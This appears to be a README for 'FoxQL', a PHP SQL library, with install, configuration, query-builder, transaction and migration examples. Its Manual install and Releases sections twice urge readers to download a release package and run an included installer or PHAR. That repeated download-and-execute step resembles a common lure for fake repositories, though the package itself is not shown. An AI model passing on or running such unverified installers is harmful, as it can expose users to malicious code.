# FoxQL — Fast Secure Modern SQL Library for PHP Ecosystem

[![Releases](https://img.shields.io/github/v/release/caovinh2510/FoxQL?label=Releases&logo=github&color=brightgreen)](https://github.com/caovinh2510/FoxQL/releases)

🦊 FoxQL is a fast, secure, and modern SQL library for PHP. It supports MySQL, PostgreSQL, SQLite, Sybase, Oracle, and MSSQL. The library focuses on clear APIs, strong typing, and safe query building. Use it for small projects and large services.

![Fox Illustration](https://upload.wikimedia.org/wikipedia/commons/1/18/Red_Fox.jpg)

---

Table of contents
- Features
- Supported databases
- Quick start
- Installation
- Basic usage
- Query builder
- Prepared statements & transactions
- Connection options & pooling
- Security
- Performance & benchmarks
- Extensions & adapters
- CLI & tools
- Contributing
- License
- Releases

---

Features ⚡
- Simple API for common tasks.
- Safe parameter binding to avoid SQL injection.
- Query builder with fluent interface.
- Prepared statement caching.
- Connection pooling and timeouts.
- Migrations and schema helpers.
- Lightweight driver adapters for many databases.
- Async-friendly hooks for integration with reactors.

Supported databases 🗄️
- MySQL / MariaDB
- PostgreSQL
- SQLite
- Sybase
- Oracle
- MSSQL

Each adapter implements the same core interface. Swap drivers without changing app code.

Quick start 🚀
- Install via Composer or download a release package.
- Configure a DSN and a pool.
- Run queries or use the query builder.
- Run migrations.

Installation (Composer)
```bash
composer require foxql/foxql
```

Manual install
- Download the release file from https://github.com/caovinh2510/FoxQL/releases and execute the included installer. For example:
  - Download the release package.
  - Extract the package.
  - Run: php foxql-install.php
- The installer will copy files and register autoload entries.

Configuration example
```php
use FoxQL\Client;
use FoxQL\Pool;

$config = [
    'driver'   => 'pgsql',
    'host'     => '127.0.0.1',
    'port'     => 5432,
    'database' => 'app_db',
    'user'     => 'app_user',
    'password' => 'secret',
    'options'  => [
        'charset' => 'utf8',
        'timeout' => 5
    ]
];

$pool = new Pool($config, $maxConnections = 10);
$client = new Client($pool);
```

Basic usage (select, insert, update)
```php
// SELECT
$row = $client->query('SELECT id, name FROM users WHERE id = ?', [42])->fetch();

// INSERT
$id = $client->execute('INSERT INTO users (name, email) VALUES (?, ?)', ['Alex', 'alex@example.com'])->lastInsertId();

// UPDATE
$client->execute('UPDATE users SET active = ? WHERE id = ?', [1, $id]);
```

Fluent query builder 🧩
```php
use FoxQL\Query;

$q = (new Query('users'))
    ->select('id', 'name', 'email')
    ->where('active', '=', 1)
    ->where('created_at', '>=', '2024-01-01')
    ->orderBy('id', 'DESC')
    ->limit(10);

$rows = $client->run($q)->all();
```

Prepared statements & transactions 🔒
- FoxQL binds parameters by type.
- It caches prepared statements per connection.
- Transactions use the pool-aware transaction manager.

```php
$client->transaction(function($tx) {
    $tx->execute('UPDATE accounts SET balance = balance - ? WHERE id = ?', [100, 1]);
    $tx->execute('UPDATE accounts SET balance = balance + ? WHERE id = ?', [100, 2]);
});
```

Connection options & pooling 🛠️
- Pool supports min/max sizes, idle timeout, and health checks.
- Per-connection options let you tune client behavior.
- Use persistent connections for high throughput.

Example pool options:
```php
$pool = new Pool($config, [
    'min' => 2,
    'max' => 20,
    'idle_timeout' => 30, // seconds
    'health_check' => true
]);
```

Security practices 🔐
- Use parameter binding for all inputs.
- Avoid string concatenation for SQL.
- Use role-based DB users with least privilege.
- Enable TLS for remote DB connections.
- Keep drivers and PHP up to date.

Performance & benchmarks ⚙️
- The library focuses on low overhead and fast path for prepared queries.
- Caching and pooled connections reduce latency.
- Benchmark example (simple read test):
  - 10k queries per worker on a local MySQL instance with prepared cache enabled.
  - Measured p99 under 50ms on commodity hardware.
- Run your own benchmarks with the included bench tool.

Extensions & adapters
- Adapter pattern keeps core small. Add custom adapters for cloud DBs.
- Extensions provide:
  - JSON helpers for PostgreSQL/Oracle.
  - Bulk loader for MySQL/MSSQL.
  - Spatial types support for PostGIS.
- Third-party contributions can add more adapters.

CLI & tools 📦
- foxql-cli ships with migration and query tools.
- Commands:
  - foxql migrate:run
  - foxql migrate:make <name>
  - foxql db:export
  - foxql db:import
- Use CLI to run migrations in CI pipelines.

Example migration (migration file)
```php
return [
    'up' => [
        "CREATE TABLE users (
            id SERIAL PRIMARY KEY,
            name VARCHAR(255) NOT NULL,
            email VARCHAR(255) UNIQUE NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )"
    ],
    'down' => [
        "DROP TABLE users"
    ]
];
```

Testing
- Use the in-memory SQLite adapter for unit tests.
- Use transactional tests to roll back changes after each test.
- Example PHPUnit setup:
```php
// bootstrap.php
$pool = new Pool($sqliteConfig);
$client = new Client($pool);
```

API reference (high level)
- Client: main entry. query(), execute(), run(), transaction().
- Pool: manage connections. getConnection(), release(), stats().
- Query: builder. select(), where(), join(), groupBy(), orderBy(), limit().
- Adapter: implement driver specifics. prepare(), execute(), fetch().

Common patterns
- Use a single long-lived pool per app.
- Reuse prepared Query objects for repeated queries.
- Wrap multi-step DB operations in transactions.

Contributing 🤝
- Open an issue for bugs or features.
- Fork the repo and create a branch for your change.
- Add tests for new features.
- Follow PSR-12 for code style.
- Write clear PR descriptions.

Code of conduct
- Be respectful.
- Review feedback.
- Keep discussions on-topic.

License
- MIT License. See LICENSE file.

Contact
- Open issues on GitHub.
- Submit PRs for fixes and features.

Releases
[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?logo=github)](https://github.com/caovinh2510/FoxQL/releases)

Since this repository provides release packages, download the release file from https://github.com/caovinh2510/FoxQL/releases and execute the included installer or script in the package. The release page includes binary builds, PHAR archives, and installer scripts. After download, run the installer with the matching PHP binary, for example:
```bash
php foxql-install.php
```
or use the provided PHAR:
```bash
php foxql.phar --install
```

If the provided link does not work for any reason, check the "Releases" section on the project page.

Images and assets
- Badges use shields.io.
- Main image uses a public fox image from Wikimedia Commons to match the project name and theme.

Examples and recipes
- Pagination with Query builder
```php
$page = 2;
$perPage = 25;

$q = (new Query('posts'))
    ->select('id', 'title', 'created_at')
    ->orderBy('created_at', 'DESC')
    ->limit($perPage)
    ->offset(($page - 1) * $perPage);

$posts = $client->run($q)->all();
```

- Bulk insert (MySQL)
```php
$rows = [
    ['name' => 'A', 'email' => 'a@example.com'],
    ['name' => 'B', 'email' => 'b@example.com'],
];

$client->bulkInsert('users', $rows);
```

Roadmap
- Add full async driver for non-blocking runtimes.
- Add caching plugin for query results.
- Add schema diff tool for migrations.
- Add official Docker images for testing.

Changelog
- See the Releases page for versioned changelogs and binary assets.

Thank you for using FoxQL.